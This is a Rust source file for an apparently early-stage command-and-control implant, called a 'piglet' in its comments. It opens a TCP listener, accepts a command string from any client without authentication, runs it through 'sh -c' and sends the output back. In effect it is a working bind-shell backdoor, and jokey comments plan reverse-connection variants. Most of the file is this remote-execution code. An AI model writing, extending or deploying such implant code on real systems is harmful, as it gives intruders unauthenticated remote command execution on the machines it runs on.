// implants are called piglets, they can run code / execute stuff
// they have a list of tasks, bind_port, call_home_addr, protocol
//

use std::io::Read;
use std::io::Write;
use std::net::TcpListener;
use std::net::TcpStream;
use std::process::Command;
extern crate uuid;
mod piglet;
use crate::piglet::Piglet;
mod tasks;

fn get_command_from_stream(mut stream: &TcpStream) -> String {
    let mut buffer = [0; 1024];
    stream.read(&mut buffer).unwrap();
    let kommando = String::from_utf8_lossy(&buffer[..])
        .to_string()
        .trim_matches(char::from(0))
        .to_string();
    kommando
}

fn run_cmd_sh(piglet: &Piglet) -> Vec<u8> {
    // we write the result of the command to the stdout stream and pass that to the TcpStream buffer as Vec<u8>
    let result = Command::new("sh")
        .arg("-c")
        .arg(piglet.tasklist.tasks[0].command.trim())
        .output()
        .expect("command execution failed");

    /*
    once we received a Kommando we want to push it to the tasklist of the piglet
    when we have the result/output we want to update the TaskStatus to "completed"
    */
    result.stdout
}

fn write_response(mut stream: TcpStream, message: Vec<u8>) {
    stream.write_all(&message).unwrap();
    stream.flush().unwrap();
}

fn main() {
    let mut piglet: Piglet = Default::default();
    println!("{piglet}");
    let listener =
        TcpListener::bind(format!("{}:{}", piglet.call_home_addr, piglet.bind_port,)).unwrap();
    // Result[OK] -> T -> unwrap takes this T or if Result[Err] panics with the Err
    // unwrap panics and does not handle errors gracefully -> no use plz, mr coder., gimme graceful error handling plz.

    for stream in listener.incoming() {
        let stream = stream.unwrap();
        let kommando = get_command_from_stream(&stream);
        piglet.add_task(kommando);
        println!("{piglet}");
        // think about whether a giplet would be a reverse connection piglet. @Trismah's idea.
        // riplet / steaklet / schnitzlet

        let res = run_cmd_sh(&piglet);
        write_response(stream, res);
        // next steps:
        // handle the stream and extract "Kommando"
        // how do we extract the body from the requests?
        // do we want to use raw HTTP requests or TCP Traffic?
    }
}
